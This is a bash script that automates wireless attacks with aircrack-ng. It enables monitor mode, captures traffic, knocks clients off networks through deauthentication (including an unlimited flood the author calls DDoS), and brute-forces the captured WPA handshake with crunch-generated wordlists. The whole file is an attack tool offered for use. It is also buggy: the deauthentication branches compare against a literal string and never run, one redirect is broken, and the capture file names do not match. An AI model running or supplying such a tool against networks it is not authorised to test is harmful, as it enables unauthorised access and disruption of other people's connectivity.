#!/usr/bin/bash
# Created by Donald.
# ---------------------------------------- Dependency Check--------------------------------------------
check_depend() {
   if command -v dnf > /dev/null; then
   	sudo dnf install crunch kitty aircrack-ng -y > /dev/null
   elif command -v apt > /dev/null; then
   	sudo apt install crunch kitty aircrack-ng -y > dev/null
   elif command -v pacman > /dev/null; then
        echo "Please make sure you have yay or any AUR installed on your Arch distro."
	echo -e "y/ny" | sudo pacman -S kitty aircrack-ng crunch > /dev/null
   else
	echo "No supported package manager found."
        exit 1
fi
}
# ---------------------------------------- Main Code ----------------------------------------------
echo "===================== Please make sure you memorize your BSSID(or copy them), do not use if you don't know what you are doing ============================================="
echo "Please enssure you have aircrack-ng suite installed on your Linux Distro."
read -p "Do you know the wifi interface of your pc(y/n): " ans
ans="${ans,,}"
if [[ "$ans" == "y" ]]; then
    read -p "Enter the interface here: " interface
    sudo airmon-ng check kill
    sudo airmon-ng start "$interface"
elif [[ "$ans" == "n" ]]; then
    read -p "Do you want me to run ipconfig(y/n): " response
    response="${response,,}"
    if [[ "$response" == "y" ]]; then
    sudo iw dev | grep Interface
    read -p "Enter what you see: " interface
    sudo airmon-ng check kill
    sudo airmon-ng start "$interface"
   fi
fi
mkdir -p "$HOME/Captures"
cd "$HOME/Captures" || exit 1
sudo airodump-ng "$interface"mon
read -p "Have you gotten a channel(y/n): " ans1
if [[ "$ans1" == "y" ]]; then
   read -p "Which channel: " ans2
   sudo airodump-ng --channel "$ans2" -w capture_01 "$interface"mon
elif [[ "$ans1" == "n" ]]; then
   echo "Please get a channel."
   exit 0
fi
start_scan() {
   kitty --class Scanning -e sudo airodump-ng start --channel "$ans2" -w capture_01 "$interface"
}
deauthenticate() {
   start_scan
   read -p "Standard deauthentication(s) or DDoS(d): " deauth_response
   read -p "Enter BSSID: " bssid1
   read -p "Enter clients MAC Address: " mac_address
   if [[ deauth_response == "s" ]]; then
   	kitty --class  Deauthentication -e sudo aireplay-ng --deauth 10 -a $"bssid1" -c "$mac_address" "$interface" --ignore-negative-one
   elif [[ deauth_response == "d" ]]; then
	kitty --class  Deauthentication -e sudo aireplay-ng --deauth 0 -a $"bssid1" -c "$mac_address" "$interface" --ignore-negative-one
   fi 
} 
read -p "Need for deauthentication(y/n): " ans3
if [[ "$ans3" == "y" ]]; then
    deauthenticate
elif [[ "$ans3" == "n" ]]; then
	exit 0
fi
 
# ------------------------------------------- Cracking Part -----------------------------------------------
echo "I'll be using crunch to generate."
read -p "Do you have crunch installed(y/n): " ans5
if [[ "$ans5" == "n" ]]; then
   check_depend
   stat=$?
   if [[ $stat -eq 0 ]]; then
  	read -p "Enter any characters for generation(e.g abcdefg or abc123!@#): " char
   	read -p "Enter the size of characters(e.g 8, 12, 18): " size
   	sudo crunch "$size" "$size" "$char" | sudo aircrack-ng -w - capture-01.cap 
    elif [[ $stat -ne 0 ]]; then
        echo "Error downloading crunch, quiting..."
        exit 1
    fi
elif [[ "$ans5" == "y" ]]; then
      read -p "Enter any characters for generation(e.g abcdefg or abc123!@#): " char
      read -p "Enter the size of characters(e.g 8, 12, 18): " size
      crunch "$size" "$size" "$char" | sudo aircrack-ng -w - capture-01.cap
fi

# ---------------------------------- Post Script(Clean-up and exit) ---------------------------------------
echo "Cleaning up now......"
sudo airmon-ng stop "$interface"mon
sudo systemctl restart NetworkManager > /dev/null
exit 0
